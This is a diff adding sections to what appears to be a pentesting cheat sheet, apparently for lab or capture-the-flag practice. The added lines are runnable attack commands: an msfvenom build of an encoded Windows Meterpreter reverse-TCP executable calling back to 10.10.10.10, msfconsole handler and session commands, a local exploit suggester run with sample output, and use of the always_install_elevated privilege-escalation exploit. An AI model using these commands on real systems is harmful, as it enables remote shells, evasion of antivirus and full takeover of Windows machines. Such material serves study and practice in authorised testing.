@@ -350,3 +350,56 @@ OR
 
 ##### get the content of files
  ```findstr /sin /i "iamtheadministrator" * > C:\users\public\tes.txt 2>C:\users\public\error```
+
+```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o m.exe```
+
+```msfconsole```
+
+```
+use windows/meterpreter/reverse_tcp
+set LHOST
+set LPORT
+run
+```
+
+```
+sysinfo   # Zeigt Betriebssystem, Architektur etc.
+getuid    # Zeigt den aktuellen Benutzer
+getprivs  # Zeigt die verfügbaren Rechte
+```
+
+```
+sessions -l
+sessions -i <session_id>
+```
+
+```
+background
+```
+
+```
+use post/multi/recon/local_exploit_suggester
+set SESSION <session_id>
+run
+```
+
+```
+<SNIP>
+*] Running check method for exploit 41 / 41
+[*] 10.129.181.99 - Valid modules for session 1:
+============================
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
+ 2   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.
+
+<SNIP>
+```
+
+```
+use exploit/windows/local/always_install_elevated
+set SESSION <session_id>
+exploit
+```
+
